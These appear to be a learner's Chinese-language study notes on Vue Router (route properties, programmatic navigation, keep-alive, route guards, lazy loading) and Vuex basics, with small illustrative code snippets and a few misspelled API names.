### $route身上的属性

> $route.query
- 该对象里保存着 别人通过query方式传递过来的参数
- 模板中可以直接使用 $route.query.id 的方式获取


> $route.params
- 该对象里保存着 别人通过params方式传递过来的参数
- 模板中可以直接使用 $route.params.id 的方式获取
<!-- 
  /666/你好啊
  path: /:id/:message
  $route.params
 -->


> $route.fullPath
> $route.hash
> $route.path
> $route.meta
- 在meta中我们可以放一些 程序员自定义的信息

> $route.name
> $route.matched

- 上述这些都是通过 $route 输出就可以看到


--------------------------

### 编程式路由导航
- 不借助router-link实现的跳转就是编程式的路由导航
- 我们通过$router身上的方法来完成逻辑 $router是new VueRouter的实例

> this.$router.push(参数)
> this.$router.replace(参数)
- 使用push模式跳转 会留下历史记录
- 使用replace模式跳转 不会留下历史记录

- 参数：
- 方式1： 配置对象
<!-- 
  this.$router.push({
    path: '/home',
    query: {
      key: value
    }
  })
 -->

- 方式2： 路径
<!-- 
  this.$router.push('/home')
 -->


> this.$router.back()
> this.$router.forward()
- 后退和前进功能


> this.$router.go()
- 接收一个整数 2 连续前进二步 -2 连续后退二步

<!-- 
  <button @click='homeClick'>首页</button>
  <button @click='aboutClick'>关于</button>

  我希望通过监听这两个按钮的点击, 使用内部的处理函数来进行路由之间的跳转
  App.vue --- script标签内部

  export default {
  name: 'App',
  methods: {
    homeClick() {
      this.$router.push('/home')
    },
    aboutClick() {
      this.$router.push('/about')
    },
  }
}
-->  


**注意：**
- 使用编程式路由导航 对象的形式传递params的时候 可能不能用path要用name

--------------------------

### 缓存路由组件 <keep-alive>
- 作用：
- 让不展示的路由组件保持挂载 不被销毁

- 有这么一个场景 一个注册页面 我们填写完了很多的信息 然后点击按年切换到了别的页面
- 这时候我们再回来发现我们写的信息都没有了
<!-- 
  因为跳转到另一个页面 前一个组件就会被销毁 我们回退回去之后它属于重新生成
  里面的内容就是生成的新的 没办法diff算法 没办法复用 只能用新的节点替换掉旧的节点
 -->

- 那怎么才能保存之前我们浏览的状态呢？


> <keep-alive> 
- 是vue内置的一个组件, 可以使被包含的组件保留状态, 或避免重新渲染和重新创建
- 放在里面的组件会被缓存

<!-- 
  <keep-alive>
    <router-view></router-view>       看这里
  </keep-alive>
 -->

- 放在 keep-alive 里面的状态都会被保存 也就是显示在里面的组件不会被销毁
- 但是也不是所有的组件被缓存就是好的 我们可以针对那些需要被缓存的项目进行缓存
- 比如 input


> <keep-alive include=‘字符串或者正则表达式’>
- 字符串或正则表达, 只有匹配的组件会被缓存
- 如果有多个组件需要用，号隔开
<!-- 
  <script>
  export default {
    name: 'Home',     就这个name
-->


> <keep-alive exclude=‘字符串或者正则表达式’>
- 字符串或正则表达, 任何匹配的组件都不会被缓存


> 注意 当有多个组件要被缓存的时候 还可以传递数组
> <keep-alive :exclude='["News", "About"]'>


> 注意 exclude='不要随意加空格'
- 正则里面也不要有空格
<!-- 
  <keep-alive exclude='Profile,User'>      这是对的
  <keep-alive exclude='Profile, User'>     这是错的
-->


> 注意 exclude=‘这里面的name是’ 是组件名


> 当遇到嵌套路由的时候, 可能并没有起到我们想要的效果(不重新创建组件渲染页面)
> 解决方案1
- 我们的嵌套路由是通过在路由里面添加 children:[] 属性传递的
- 里面有一个 redirect 属性 是用来做刷新页面时 显示默认页面的
<!-- 
  {
    path: '/home',
    component: Home,

    meta: {
      title: '首页'
    },
    
    children: [
      {            --------------------------
        path: '',
        redirect: 'news'    我们把这个部分禁掉
      },          ---------------------------
      {
        path: 'news',
        component: HomeNews,
      },
      {
        path: 'message',
        component: HomeMessage,
      }
    ]
  },
 -->

- 禁掉 redirect 就意味着 每次我们进入home页面的时候需要手动点击 新闻 或者 消息的链接才会有内容, 为了解决这个问题 我们可以这样
- 在Home.vue文件里, 使用 created() {} 声明周期函数 当创建该组件的时候 修改链接的地址
<!-- 
  export default {
    name: 'Home',

    // 创建时候的生命周期函数
    created() {
      console.log('created');

      // 通过push方法 在该组件被创建的时候 修改地址
      this.$router.push('/home/news');
    },

    // 销毁时候的生命周期函数
    destroyed() {
      console.log('destroyed')
    }
  }
 -->
- 在 created() {} 生命周期函数中 使用 this.$router.push('/home/news'); 方式
- 但是上述方法不行, 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面


> 第二种
- 我们尝试了第二种解决方式
- 在该组件中声明一个默认路径
<!-- 
  data() {
    return {
      // 为了解决 禁掉 redirect属性后 刷新页面没有默认显示的问题, 我们定义了一个默认路径
      path: '/home/news'
    }
  },
 -->

- 然后使用 created() { ... } 生命周期函数, 在创建该组件时, 将路径修改为 /home/news
<!-- 
  created() {
    console.log(this.path);

    // 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面
    // this.$router.push('/home/news');
  },
 -->

- 上述方法也失败了
- 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面


> 第三种解决方案
- 该方式只能在 router-view 被 keep-alive 包裹起来之后使用
- 使用 activated() { ... }
- 当该组件处于活跃状态的时候, 修改路径

- 使用 beforeRouteLeave(to, from .next) { ... }
- 要离开该组件的时候, 把路径保存起来, 为的就是记录离开时的状态
<!-- 
  activated() {
    // 当该组件处于活跃状态的时候, 修改路径
    this.$router.push(this.path);
  },

  // 我们使用在组件内的导航守卫 
  beforeRouteLeave(to, from, next) {
    // 为了记录上一次离开时候的状态 我们使用了这个组件内的导航守卫 
    // 离开该组件的时候 要把离开的组件路径记住, 然后把这个路径保存给this.path 就是为了记录上一次离开时的状态
    // 导航离开该组件的对应路由时调用

    console.log(this.$route.path);
    this.path = this.$route.path;
    next();
  }
 -->

--------------------------

### 缺失的生命周期 和 路由组件独有的生命周期函数
- 以前我们在mounted函数里面开启定时器 在组件即将被销毁的函数里面关闭定时器
- 但是有一个问题 路由组件在切换的时候 有的时候不会关闭定时器 比如嵌套的结构
- 所以我们可以利用下面的两个路由组件的生命周期函数


> activated() { }
- 处于活跃状态的时候执行该回调    激活 (组件出现在你面前)
<!-- 
  在这个函数中开启定时器
 -->


> deactivated() { }
- 不处于活跃状态的时候执行该回调  失活 (组件消失在你面前)
<!-- 
  在这个函数中关闭定时器
 -->


> nextTick(function() { })
- 这个不是路由组件的生命周期
- 当修改了数据之后 vue帮我们操作完dom之后 把真实的dom放在页面了 就会调用这个函数

--------------------------

### 路由守卫
- 古代有御前侍卫 是保护君王的安全
- 路由守卫就是保护路由的安全(权限)

- 我想让你看什么 或者 不想让你看什么

- 比如有些导航按钮 我们需要在满足一些条件之后才能点的时候 比如用户的个人中心 我们是不是需要验证看看是否登录
<!-- 
  Home      这个随便点
  About      这个随便点

    News      只有学校是尚硅谷 才能点
    Message   只有学校是尚硅谷 才能点


  比如我们把学校存在localStorage里面
  school: atguigu

  也就是说 我们在点击 News Message 的时候我们需要校验一下 看看学校是不是atguigu 如果是再呈现给用户
 -->


> 点击路由按钮后的流程
- 用户点击导航区  ---  引起了路径的改变  ---  前端路由器监测到然后进行规则的匹配  ---  在合适的位置呈现组件

- 我们在上述的哪一个环节中加入校验最为合适  --- 前端路由器监测到然后进行规则的匹配 这个环节
<!-- 
  我们跟路由器说 假如以后有人访问的是 /home/news 你能去localStorage里面的school 看看值是不是atguigu如果是你就正常的呈现组件 如果不是 你就不要呈现组件
 -->

- 我们要在router的配置文件中进行配置守卫 回到router文件夹下的index.js文件
- 在暴露路由对象前 我们添加路由守卫
<!-- 
  const router = new VueRouter({
    routes: [
      {
        name: 'shouye'      // 路由的别名
        path: '/home',
        component: Home
      }
    ]
  })

  router.beforeEach()

  // 最后暴露
  export default router
 -->


> 全局前置路由守卫
> router.beforeEach((to, from, next) => {})
- 都是路由实例对象身上的方法
- 释义：
- 在每一次路由切换之前 都会调用这个函数 初始化的时候也会被调用

- 参数：
- to：   你要去哪     它是一个对象 是目标的路由信息
<!-- 
  里面有 hash query params name meta matched等属性或对象 就是目标的route
 -->

- from： 你从哪里来   它是一个对象 目前所处位置的路由信息
- next():   用于放行 该流程才能继续走下去


> 应用场景
- 怎么应用这个 全局前置路由守卫呢？  我们可以判断一下什么时候放行 什么时候不放行
<!-- 
  比如 学校名是atguigu就放行 或者我们已经拿到了要去哪个路由 我们可以根据to身上path判断也可以

  router.beforeEach((to, from, next) => {
    if(localStorage.getItem('school') === 'atguigu') {
      next()
    }
  }) 

  如果是多个路由都要进行判断怎么办？ 再包一层if
  router.beforeEach((to, from, next) => {
    if(to.path === '/home/news' || to.path === '/home/message') {

      if(localStorage.getItem('school') === 'atguigu') {
        next()
      }

    } else {    上面是当是那两种情况我们加上限制 如果不是那两种情况我们就要放行
      next()
    }
  }) 
 -->


- 上面有一个地方不太好 就是我们对某一些按钮进行限制的时候要对它们进行判断 但假如有12个按钮 难道我们要在这里写12个条件么？
<!-- 
  if(to.path === '/home/news' || to.path === '/home/message')
 -->

- 怎么解决这个问题呢？
- 就是给每一个路由配置里面添加一个特殊的属性 用于标识着本路由是否需要进行权限的校验
<!-- 
  我们在路由配置规则(routes)里面加上这个属性后 to 和 from都能看到
  我就可以直接验证 to.peiqi 这个属性是不是true 就需要进判断 如果是false那就是不需要进行权限的校验

  路由组件身上有什么信息 我们可以输出 this.$route
 -->

- 那这个特殊的属性 加在 路由配置对象的哪里呢？


> meta 路由元信息
- 它是routes中的一个配置想 值是对象类型
- 作用：
- 在meta中我们可以放一些 程序员自定义的信息
<!-- 
  我们想放的特殊的数据
  router免费给我们提供的一个容器可以随意往里放东西
-->

- 结合上面的例子 我们可以在meta中放置一个特殊的标识属性
- 代表是否授权 isAuth
- 谁需要权限的校验meta配置项就放在对应的路由规则里面 
- isAuth: true 就代表该路由需要权限的校验
- 技巧：
- 不用每一个路由规则里面都写 isAuth: true 或者 isAuth: false
- 不写的路由规则里 没有就是undefined 就是false呗
<!-- 
  routes: [
    {
      name: 'guanyu',
      path: '/about',
      component: About,

      // 我们在meta中输入些 自定义的数据 isAuth 用于标识该路由是否需要进行权限的验证
      meta: {
        isAuth: true
      }
    }
  ]

  router.beforeEach((to, from, next) => {

    // 判断是否需要鉴定权限
    if(to.meta.isAuth) {

      if(localStorage.getItem('school') === 'atguigu') {
        next()
      }

    } else {
      next()
    }
  }) 
 -->

> 技巧：
- 路由组件身上有什么信息 我们可以输出 this.$route 


> 后置路由守卫
> router.afterEach((to, from) => {})
- 该函数会在初始化的时候 和 每次路由切换之后被调用 切换已经切完了
- 后置路由守卫没有next 因为来都来了

- to from也是路由信息

- 应用场景：
- 我们没切换一次路由的时候 页签的title可以跟着变化
<!-- 
  js里可以使用 document.title

  比如我们可以在 meta 当中给每一个路由规则里面都配置一个title
  meta: { title: '关于' }

  router.afterEach((to, from) => {
    document.title = to.meta.title || '硅谷系统'
  })
 -->

--------------------------

### 独享路由守卫
- 一个路由单独想用的路由守卫
- 比如我们一个项目里面有很多的路由 但是我只想用路由守卫对一个路由进行限制
<!-- 
  比如我们的组件有首页 关于 新闻 消息 等 我们现在只想对 关于页面进行权限监测 那么就可以在这个关于的页面里面 配置 一个路由守卫
 -->

- 我们在一个路由规则里面配置 独享路由守卫
<!-- 
  routes: [
    {
      name: 'guanyu',
      path: '/about',
      component: About,

      beforEnter: (to, from, next) => { ... }
    }
  ]
 -->

> beforEnter: (to, from, next) => { }
- 在某一个路由的配置项里面进行配置 如上
- 某一个路由独享的守卫


> 独享路由守卫只有前置没有后置

--------------------------

### 组件内的路由守卫
- 也就是在组件里面写路由守卫 而不是在路由的配置文件里面写
- 都写在组件内的配置项里面 和 methods等 同级

> beforeRouterEnter(to, from, next) { ... }
- '通过路由规则进入' 该组件时被调用 进入之前会调用
<!-- 
  比如我们直接写组件标签 渲染出来的组件就不会调用这个函数
 -->

> beforeRouterLeave(to, from, next) { ... }
- '通过路由规则离开' 该组件时被调用 走之前会调用


- 应用场景
- 比如判断权限 只是对这个组件起作用


**注意：**
- 只有全局路由守卫分前置和后置 前置是进入前

--------------------------

### 路由的懒加载
- 当打包构建应用时, js包会变得非常大, 影响页面的加载
- 如果我们能把不同路由对应的组件分割成不同的代码块, 然后当路由被访问的时候才加载对应的组件, 这样就更加高效的

- 之前我们自己配置webpack打包的时候
- 我们打包的时候会打包入口js文件, 这样所有的东西都打包在这个入口js文件里后, 这个js文件就会变得非常的大

- 这样当我们去静态资源服务器里第一次请求资源的时候, 就要花费过长的时间因为js文件太大了, 所以在请求的过程当中浏览器会出现短暂的空白的
- 而且 我们自己使用webpack配置打包的时候, 并没有把css文件单独做抽离, 相当于是在js文件里面包含的

- 而脚手架配置的时候, 就发现了这个问题, 对我们的js文件和css文件进行了分包
- 脚手架配置的webpack会对css文件做分离处理
<!-- 
  脚手架打包后的目录结构

  | - dist
    | - static
      | - css
        .css文件  该项目所有的css相关文件 打包到这里

      | - js
        
        appxxxx.js
        当前应用程序开发的代码都在这里面 自己写的业务代码都在这里

        manifestxxx.js
        为我们打包的代码最低层支撑的, 我们在项目开发的时候用了很多的模块化导入导出, 在项目开发里面既可以用es6导出 也可以用commonjs 但是根本就不支持commonjs 为了让它有效能让浏览器识别 这样的代码都放在这里了

        vendorxx.js   
        在项目里引用的第三方的东西(比如vue vue-router axios) 只要是第三方的东西vue在打包的时候都会打包在这里
 -->

- 上面我们大致了解了vue在给项目打包的时候会把js 和 css文件进行分别处理, 所有css相关的文件会放到css文件里

- js文件也会按照, 第三方框架 -- 底层支撑 -- 业务逻辑 分成这三个js文件, 当我们的项目慢慢做大的时候, 业务逻辑代码量也会相应的增加, 就会造成一个问题, 我们用户在第一次向静态服务器请求资源的时候, 由于加载的js文件大而且过多, 页面会出现短暂的空白

- 所以我们在真是开发中, 通常会选择一个路由打包成一个js文件, 默认的情况下并不会跟整个资源一起请求过来
<!-- 
  比如用户点开界面展示的是首页, 那就把首页对应的js文件请求过来就可以了, 至于其他的模块先放到服务器里, 我现阶段值请求了一个
 -->

> 如何避免这种情况呢?
- 使用路由的懒加载
- 将不同的理由对应的组件打包到不同的js文件里面

> 路由懒加载做了什么?
- 路由看加载的主要作用就是将理由对应的组件打包成一个个的js代码块
- 只有在这个理由被访问到的时候, 才加载对应的组件


> 懒加载的方式
> 方式一: 不推荐
- 异步组件
<!-- 
  const Home = resolve => {
    require.ensure(['../components/Home.vue'], () => {
      resolve(require('../'components/Home.vue'))
    })
  }
 -->


> 方式二: AMD写法
const About = resolve => require(['../components/Home.vue'], resolve);


> 方式三: 推荐
- 在es6中, 我们可以有更加简单的写法来组织vue异步组件和webpack的代码分割
- const Home = () => import('../components/Home.vue')

> 总结:
- 实现路由懒加载就是把以前普通的导入方式 修改为 通过函数调用的方式
- 一个懒加载会对应一个js文件

<!-- 

  // 把下面三种导入 删掉 
  --- 删除 --- > import Home from '../components/home'
  --- 删除 --- > import About from '../components/about'
  --- 删除 --- > import User from '../components/User'

  // 把上面的形式修改为路由懒加载
  const Home = () => import('../components/home')
  const About = () => import('../components/about')
  const User = () => import('../components/User')
  

  // 再在下面时候 Home About User
  const routes = [
  {
    path: '/',
    redirect: '/home'
  },

  {
    path: '/home',
    component: Home
  },
  {
    path: '/about',
    component: About
  },
  {
    path: '/user/:userId',
    component: User
  }
]
 -->

--------------------------

### Vuex
> 概念：
- 专门在vue中实现集中式状态(数据)管理的一个vue插件 对vue应用中多个组件的共享状态进行集中式的管理(读/写)，也是一种组件间通信的方式，且适用于任意组件间通信

- 注意：
- 它是一个插件哦 Vue.use(Vuex)
- 响应式的, 管家内部的变量被改变的时候 界面自动刷新


> 什么时候使用vuex
- 多个组件依赖于同一状态
- 不同组件的行为需要变更同一状态(也就是别的组件的操作都会修改vux中的数据)

- 也就是共享


> 状态管理到底是什么?
- 状态管理模式, 集中式存储管理这些名词听起来就非常高大上, 让人捉摸不透, 其实 可以简单的将其看成, 把需要多个组件共享的变量全部存储在一个对象里面

- 然后将这个对象放在顶层的Vue实例中 让其他组件可以使用, 那么多个组件是不是就可以共享这个对象中的所有变量属性了呢?

- 而且所有组件可以读取vuex中的数据，同时所有组件也可以修改vuex中的数据
- 其它组件看到的是数据被修改后的值

<!-- 
  我们可以把上述中说到的状态, 理解为一个变量 现在我们要用这个变量存储这个状态
  当很多个组件都想用到这个状态的时候
    (组件是一个树结构, 将状态放在哪个组件里都不合适, 因为底层C组件想用顶层A组件的状态时, 需要从顶层层层传递到底层组件)

  我们可以 new一个专门的对象, 我们把new出来的这个对象当做是一个管家 这个管家帮我们管理这个状态
              
          (所有组件的状态都交给管家来管理就是集中式)
        这个数值需要共享, 我们就在公共的部分创建这个对象

                      对象: 管家
                        count:0  

          组件A         组件B         组件C

 -->


> Vuex帮我们管理的常用状态
- 我们所说的状态, 这个状态会在多个界面间共享的问题
- 比如 用户的登录状态(token), 用户名称, 头像, 地理位置信息等等
- 比如 商品的收藏, 购物车中的物品等等
- 这些状态信息, 我们都可以放在同一的地方, 对它进行保存和管理, 而且它们还是响应式的

--------------------------

### Vuex - 单界面 到 多界面状态管理的切换
- 在单个组件中进行状态管理是一件非常简单的事情

> 单组件中的数据 行为 页面之间的关系
<!-- 
  在单界面中有3个角色

         Actions

      ↗         ↘

  View      ←        State
 -->

> State: 
- 用于存储当前这个界面或者这个组件里面的状态
<!-- 
  前面说了我们是通过变量来保存状态 而单个组件中的变量一般保存在
  data() {return {这里}} 
  
  所以对于我们单个组件来说, State相当于我们的data 如果data里面定义多个变量 就相当于保存了多个状态 而data中的状态是放在View里面显示的 
-->


> View
- View里面引用了也data中的状态 通过{{}}显示在页面中做了展示
- 而View里面又产生了一些行为(Actions) 比如用户发生了点击


> Actions
- 一旦发生了Actions的时候 会返回来修改State中的状态
上面就是单页面的状态管理 上面的三个角色都是在一个.vue文件中进行管理的
- 接下来我们看看vuex是怎么用的



> 原理图
<!-- 
          Backend API
              ↑
              ↓
            Actions   -Commit- 
                              ↘
  Disp↗atch

Vcomponent                   Mutations   ← →   Devtools
    
  ↑                            ↙
   -Render-  State     < -Mutate-
 -->

- 上面图里属于 Vuex部分的三个角色 分别是 
- Actions
    一堆行为

- Mutations
    修改 加工 维护

- State
    状态 也就是数据
<!--      
  我们前面说的要数据交给Vuex来进行管理 其实说的就是State对象
  也就是说 我们将数据放在了 State对象里面 这里面能保存很多数据
 -->


> 解析原理图
- 我们先说下需求，我们在vuex存放了一个求和的数据 count
- 然后我们在组件内部 选择加几 和 加 减 来操作vuex中的数据

- 首先 我们从 Vcomponent 的角度出发， 要是想使用vuex 就必须按照vuex的流程来走 我们调用 dispatch函数传入两个参数 加还是减 加几减几也就是动作类型和数据 然后通过dispatch分发到Actions对象里
<!-- 
   dispatch(动作类型，数据)
 -->
   
- 然后我们传递的值就会到 Actions对象 里面，
- Actions也是一个对象 里面会有我们传递的数据
- 只要我们dispatch里面的动作 和 Actions里面的动作能对上 该函数就会被调用 函数内部就能收到我们传递的数据 也就是加几 减几
<!-- 
  Actions对象
  {
    jia: function(2)
  }

  用户dispatch的时候 第一个响应用户的就是acitons
 -->
  
- 然后 在上面jia的函数里面 我们自己调用commit 将加和要加的数据提交到Mutations里面
<!-- 
  jia: function(2) {
    commit(jia, 2)
  }
 -->

- 然后我们的Mutations就能收到，它的类型也是一个对象
- 这个对象里面也有我们传递过来的jia函数 函数里面有整个vuex里state对象 还有我们要操作的数据2
  {
    jia: function(state, 2)
  }

- 真正完成逻辑的地方再 Mutations 里面
<!-- 
  Mutations对象
  {
    jia: function(state, 2) {
      state.sum += 2
    }
  }
 -->

- 最后state中保存的数据就会发生变化 而且state中的数据发生变化之后 会重新调用render解析模板 做到响应式 


> 注意：
- 上面的actions感觉没有用处是么 如果我们在dispatch的时候 提交了一个动作 但是动作对应的数据 需要发ajax请求问服务器才能知道的时候

- 这个异步的动作需要在actions里面完成
- 也就是说 当我们做的是同步的动作的时候 我们可以直接在组件内部commit到Mutations里面
- 当我们的操作是异步的时候 我们还是需要在actions里面做


- 这也就是上面流程图的一圈 下面我们会仔细研究怎么使用vuex
- 还有一个问题 我们需要调用dispatch commit等方法 这些方法都在store身上 所以我们还要让所有的组件都能看到store
 


> Vuex的使用
- vuex是插件, 所以我们还是要先下载

> 1. 安装Vuex
- npm i vuex --save


> 2. 引入并注册 (我们在store文件中配置)
- 在入口文件里面 (因为里面有Vue)
- 当我们use(Vuex)后 我们就可以在new Vue的时候传递进去 store配置项了
- 同时vm vc身上都能看到$store对象
<!-- 
  只有在Vue中挂载后 它才会给Vue的原型添加 $store
  其它组件才可以通过 $store 来拿到我们创建的vuex 这样多个组件才能去仓库中取东西 Vue.prototype.$store = store
 -->

<!-- 
  import 'Vuex' from 'vuex'
  import store from 'store'   // 这里引入3中创建的store对象
  Vue.use(Vuex)

  new Vue({
    el: '#app',

    // 当我们注册了store后就可以传递store对象了
    store
  })
 -->


> 3. 创建store内部逻辑 并导出
> const store = new Vuex.Store({})
- 我们在new Vue的时候传递进去了store配置项 但是是个空的里面没有任何逻辑吧
- 最起码store要管理 actions mutations state吧
- 我们在 src 下创建 index.js文件
<!-- 
  - src
    - store
      - index.js
 -->

- 我们还需要在这个文件中创建 store对象， 它是通过new Vuex.Store()得到的
- store中一共有5个配置对象 我们简单的先写了3个
> 注意：我们在index.js文件中 引入Vue 和 Vuex
<!-- 
  // 该文件用于创建Vuex中最为核心的store
  import Vuex from 'vuex'
  import Vue from 'vue'

  // 我们必须跟store的文件一起 注册vuex
  Vue.use(Vuex)

  // 准备actions： 用于响应组件中的动作
  const actions = {}

  // 准备mutations： 用于操作数据(state)
  const mutations = {}

  // 准备state： 存储数据
  const state = {}


  // 创建store
  const store = new Vuex.Store({
    actions,
    mutations,
    state
  })

  export default store
 -->

**注意：**
- 如果我们像下方这样写的话 会报错 说不能在Vue.use(Vuex)之前创建store实例对象 说不能在注册vuex之前创建store实例

- 也就是说每引入一个模块webpack都会将这个模块里面的代码跑一边 我们报错的原因就是 先创建了store实例 然后才注册的Vuex
<!-- 
  // main.js文件内
  import Vuex from 'vuex'
  import store form 'store'

  Vue.use(Vuex)
 -->

- 还有一点webpack会将所有的import语句汇总到最上方统一执行 不管你的import语句写在了其它语句的后面

- 那怎么改？
- 我们要在 store / index.js 文件中引入Vue 注册Vuex


> 获取Vuex中的数据
> $store.state.counter
- 创建完store对象后 就会有 $store 对象 我们可以通过this.$store的方式获取 注意模板中可以不用写this
- 其它组件可以通过 $store 对象获取 仓库中的公共变量


> 我们创建的 new Vue.Store() 中的参数有
- 固定的5个
<!-- 
  const store = new Vue.Store({

    // 1. 
    state: { },

    // 2.
    mutations: { },

    // 3.
    actions: { },

    // 4.
    getters: { },

    //5.
    modules: { }
  })
 -->

> 具体代码
- 简单的总结一下使用vuex的步骤, 我们想将共有的部分放在vuex里面管理, 这样其它的组件就可以通过 $store对象来访问 存在vuex state对象中的变量

- 1. 下载vuex插件
- 2. 创建store文件夹, 创建index.js文件
- 3. 在index.js文件中 引入vue vuex 安装插件(Vue.use())
<!-- 
  import Vue from "vue"
  import Vuex from "vuex"

  Vue.use(Vuex)
 -->

- 4. 创建store对象 const store = new Vue.store({})
<!-- 
  const store = new Vuex.Store({
    actions,
    mutations,
    state
  })
 -->

- 5. 导出store对象
- 6. 将store对象在main.js文件中引入 并 挂载在vue实例中

- 7. 回到store中 创建 state对象 在里面放上共有变量

- 8. html结构中 通过 $store 对象来获取属性
<!-- 
  // App.vue
  <template>
    <div id="app">
      <h3>{{message}}</h3>

      // 这种直接在组件中改变store中的变量的方式不推荐
      <button @click='$store.state.counter++'>按钮1</button>
      <button @click='$store.state.counter--'>按钮2</button>
      <p>{{$store.state.counter}}</p>

      <hello-vueX></hello-vueX>
    </div>
  </template>

  <script>
  import HelloVueX from './components/HelloVueX.vue';

  export default {
    name: 'App',
    data() {
      return {
        message: '我是App组件'
      }
    },
    
    components: {
      HelloVueX
    }
  }
  </script>


  // HelloVueX.vue
  <template>
    <div>
      <h3>在这个组件中也要展示App.vue中的count变量</h3>
      <p>{{$store.state.counter}}</p>
    </div>
  </template>

  <script>
  export default {
    name: 'HelloVueX',
  }
  </script>


  // vuex index.js
  import Vue from 'vue'
  import Vuex from 'vuex'

  Vue.use(Vuex)

  const store = new Vuex.Store({
    state: {
      counter:1000
    },

  })

  export default store


  // 入口js文件
  import Vue from 'vue'
  import App from './App'
  import router from './router'
  import store from './store/index'

  Vue.config.productionTip = false

  new Vue({
    el: '#app',
    router,
    store,
    render: h => h(App)
  })
 -->

--------------------------

### 多界面状态管理
- 上面的代码中 我们简单实用vuex来存储了一个可以让多个组件之间共享的变量 couter
- 我们把这个counter装在了store中的state对象中, 这个多个组件之间都可以使用 $store.state.counter访问到这个变量

- 通过$store.state.变量 就是vuex提供给我们访问公共变量的格式
- 上面说的是访问 修改也是一样的

- 下面会说下 当修改的时候 我们应该怎么操作

- 简单的说下什么是多界面状态管理
- Vue已经帮我们做好了单个界面的状态管理, 但是如果是多个界面呢?
  - 多个视图都依赖同一个状态(一个状态改了, 多个界面需要进行更新)
  - 不同界面的Actions都想修改同一个状态(Home.vue需要修改, Profile.vue也要修改这个状态)

- 也就是说对于某些状态(状态1, 状态2, 状态3)来说只属于我们某一个视图, 但是也有一些状态(状态a, 状态b, 状态c)属于多个视图共同想要维护的
  - 状态1, 状态2, 状态3 你放在自己的房间中, 你自己管理自己用 没问题
  - 状态a, 状态b, 状态c 我们希望交给一个大管家来统一帮助我们管理
  - Vuex就是为我们提供这个大管家的工具

- 全局单例模式(大管家)
  - 我们现在要做的就是将共享的状态抽取出来, 交给我们的大管家 统一进行管理
  - 之后 你们每个视图 按照我规定好的规定, 进行访问和修改等操作
  <!-- 
    比如
    访问 我们是通过 $store.state.变量 访问
    修改 的话也有固定的格式 先往vuex里面进行提交, 提交之后vuex再进行修改
   -->
  - 这就是Vuex背后的基本思想


- 官方推荐的 修改 vuex 中共享变量的流程图
<!-- 


                   Actions
      dispatch↗              ↘commit

Vue Components                        Mutations         Devtools

          render↖            ↙mutate
                    state
 -->

> Vue Components
- 是组件 组件可以引用state中的变量
- 但是修改state中的变量的时候 vuex希望我们先分发一个actions 然后在提交到mutations
<!-- 
  不要在其他的任何地方修改state 要是修改的话只能通过mutations来修改
  为什么呢?

  Devtools: vue开发的浏览器插件
  这个插件可以帮我们记录每次修改state的状态

  因为现在是三个组件共享一个state变量, 那state中的状态的更改可能是来自多个地方的, 如果多个组件都在修改state的话 很难跟踪到哪个组件修改这个状态了

  而Devtools可以记录每一次state被修改时的状态 我们就可以跟踪到哪一个组件改错了, 如果绕过了上面的环节 Devtools 就跟踪不到了

 -->

  
> 提交到Actions和直接提交到Mutations区别
- 其实我们也不用先通过Actions再提交到mutations的顺序来修改
- 我们可以从Vue Components 的位置直接提交到 mutations去修改state中的变量

- 区别是:
- 当有有异步操作不要直接提交到在Mutations中, Mutations都是同步操作 如果Mutations中有异步操作 Devtools也跟踪不到

- 如果有异步操作的时候要先分发到Actions中, 由Actions提交到Mutations中的就变成同步操作了
- 什么情况下会进行异步操作? 发送网络请求

--------------------------

### Vuex的基本使用  匹配处理函数
- 我们将一个数据放入到Vuex中

> 将数据配置到Vuex中
> 直接放在 store.js 文件中的 state 对象里面即可
<!-- 
  // 准备state： 存储数据
  const state = {
    sum: 0    // 将数据直接放在 state里面
  }

  // 创建store
  const store = new Vuex.Store({
    actions,
    mutations,
    state
  })
 -->


> 组件中怎么使用Vuex里面的数据

> 1. 在组件中 调用 dispatch() 将对应的逻辑交给 actions 对象中的对应函数去处理
> this.$store.dispatch(actions中配置好的处理函数, 数据)
<!-- 
  // B组件的methods
  add() {
    this.$store.dispatch('add', this.n)
      // 将加的处理逻辑 交给在 actions 对象中配置好的 处理函数中
  }
 -->

> 2. 在store中的 actions 对象里面 创建 处理函数
> actions 中的函数的参数
  - 1. context：
        也有人叫他miniStore 因为里面有一些方法 跟store中一样但没store多
        也有人这么理解，它叫做上下文也就是说 往上看看 往下看看 这个函数可能会遇到的所有方法组合成一个对象提供给你调用
        比如 commit 方法就封装在context里面

        commit
        dispatch
        getters
        state

  - 2. value：    组件中dispatch传递过来的参数

- 在组件中会调用dispatch，dispatch会指定一个store中的actions对象中的已存在的处理函数，起目的就是将组件中的事件内的逻辑交给actions中对应的处理函数去处理 而不是组件内部处理

- 我觉得这是因为想操作vuex中的数据 所以操作数据的方法其实定义在actions对象中，dispatch的作用只是用来连接 组件中和actions中的哪个处理函数起关联
<!-- 
  const actions = {
    add(context, value) {
      组件中dispatch指定的处理函数
      该函数名必须和dispatch中指定的函数名一致

      context.commit('add', value)
    }
  }
 -->

- 随后 actions 会将对应的处理逻辑 提交到 mutations 中 所以内部调用了 commit方法提交到了 mutations 里面

- 也可以理解为：
    组件 -- 指定了 actions 的对应处理函数 -- 一样 mutations 里面也要有对应的处理函数

    组件 指定 actions 中的函数 -- actions 指定 mutations 中的 像一条线一样连起来了

**注意：**
- actions对象中的函数 有commit state还能理解 那为什么要有 dispatch 呢？
- 它用来干什么？
- 我们在一个actions函数中 如果处理太多的逻辑 会让整个代码看起来非常的复杂 这时候我们就可以将分函数来处理整个的逻辑 
<!-- 
  const actions = {
    add(context, value) {
      context.dispatch('demo1', value)
    }

    传递逻辑到demo1
    demo1(context, value) {
      context.dispatch('demo2', value)
    }

    传递逻辑到demo2 然后demo2做最后的提交
    demo2(context, value) {
      context.commit('add', value)
    }
  }
 -->


> 3. 在store中的 mutations 对象里面 创建 和actions和dispatch一样的处理函数
> mutations 中的函数的参数
  - 1. state： 我们数据存放的地方
  - 2. value： 组件传递过来的数据

- 也就是说actions没起什么作用直接把要做的事情传递到了mutations里面 然后mutations才是真正工作的人 所以它能拿到state中的数据

<!-- 
  const mutations = {
    add(state, value) {
      state.sum += value
    }
  }
 -->


